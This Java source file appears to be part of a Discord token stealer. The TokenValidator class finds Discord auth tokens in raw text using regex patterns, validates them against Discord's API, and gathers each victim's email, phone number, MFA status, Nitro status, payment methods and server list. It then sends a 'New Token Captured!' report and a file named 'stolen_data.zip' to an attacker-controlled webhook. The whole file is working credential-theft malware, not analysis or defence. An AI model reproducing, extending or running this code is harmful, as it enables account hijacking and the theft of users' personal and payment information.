import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

public class TokenValidator {

    private final String webhookUrl;

    private final HttpUploader httpUploader;

    private static final Map<String, JSONObject> validatedTokens;

    private static final Pattern TOKEN_PATTERN_OLD;
    private static final Pattern TOKEN_PATTERN_MFA;
    private static final Pattern TOKEN_PATTERN_NEW;

    public TokenValidator(String webhookUrl) {
        this.webhookUrl = webhookUrl;
        this.httpUploader = new HttpUploader(webhookUrl);
    }

    public static List<String> extractTokens(String rawText) {
        Set<String> tokens = new LinkedHashSet<>();

        extractWithPattern(TOKEN_PATTERN_OLD, rawText, tokens);
        extractWithPattern(TOKEN_PATTERN_MFA, rawText, tokens);
        extractWithPattern(TOKEN_PATTERN_NEW, rawText, tokens);

        return new ArrayList<>(tokens);
    }

    private static void extractWithPattern(Pattern pattern, String text, Set<String> results) {
        Matcher matcher = pattern.matcher(text);
        while (matcher.find()) {
            results.add(matcher.group());
        }
    }

    public void validateAndReport(List<String> tokens, ZipBuilder zipBuilder) {

        Set<String> uniqueTokens = new LinkedHashSet<>(tokens);

        List<CompletableFuture<Void>> futures = new ArrayList<>();

        for (String token : uniqueTokens) {

            if (validatedTokens.containsKey(token)) continue;

            CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                try {
                    processToken(token, zipBuilder);
                } catch (Exception ignored) {}
            });

            futures.add(future);
        }

        try {
            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                .get(30, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    private void processToken(String token, ZipBuilder zipBuilder) {
        try {

            JSONObject userInfo = DiscordApiClient.getUserInfo(token);
            if (userInfo == null || !userInfo.has("id")) return;

            validatedTokens.put(token, userInfo);

            String nitroStatus = DiscordApiClient.getNitroStatus(token);
            List<String> paymentMethods = DiscordApiClient.getPaymentMethods(token);
            List<String> guilds = DiscordApiClient.getGuilds(token);

            String message = formatTokenReport(token, userInfo, nitroStatus, paymentMethods, guilds);

            if (zipBuilder != null && zipBuilder.hasData()) {

                byte[] zipData = zipBuilder.toBytes();
                httpUploader.uploadFile("stolen_data.zip", zipData, message);
            } else {
                httpUploader.uploadMessage(message);
            }

        } catch (Exception e) {

        }
    }

    private String formatTokenReport(
            String token,
            JSONObject userInfo,
            String nitroStatus,
            List<String> paymentMethods,
            List<String> guilds) {

        StringBuilder sb = new StringBuilder();

        String username = userInfo.optString("username", "Unknown");
        String discriminator = userInfo.optString("discriminator", "0000");
        String email = userInfo.optString("email", "N/A");
        String phone = userInfo.optString("phone", "N/A");
        boolean mfa = userInfo.optBoolean("mfa_enabled", false);
        String id = userInfo.optString("id", "0");

        sb.append("**New Token Captured!**\n\n");
        sb.append("**Token:** `").append(token).append("`\n");
        sb.append("**User:** ").append(username).append("#").append(discriminator).append("\n");
        sb.append("**ID:** ").append(id).append("\n");
        sb.append("**Email:** ").append(email).append("\n");
        sb.append("**Phone:** ").append(phone).append("\n");
        sb.append("**MFA:** ").append(mfa ? "✅ Enabled" : "❌ Disabled").append("\n");
        sb.append("**Nitro:** ").append(nitroStatus).append("\n");

        if (!paymentMethods.isEmpty()) {
            sb.append("\n**💳 Payment Methods:**\n");
            for (String pm : paymentMethods) {
                sb.append("  • ").append(pm).append("\n");
            }
        }

        if (!guilds.isEmpty()) {
            sb.append("\n**🏠 Servers (").append(guilds.size()).append("):**\n");
            for (int i = 0; i < Math.min(5, guilds.size()); i++) {
                sb.append("  • ").append(guilds.get(i)).append("\n");
            }
            if (guilds.size() > 5) {
                sb.append("  ... and ").append(guilds.size() - 5).append(" more\n");
            }
        }

        return sb.toString();
    }

    static {
        validatedTokens = new HashMap<>();

        TOKEN_PATTERN_OLD = Pattern.compile(
            "[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}"
        );
        TOKEN_PATTERN_MFA = Pattern.compile(
            "mfa\\.[A-Za-z\\d]{84}"
        );
        TOKEN_PATTERN_NEW = Pattern.compile(
            "[A-Za-z\\d]{24}\\.[\\w-]{6}\\.[\\w-]{38}"
        );
    }
}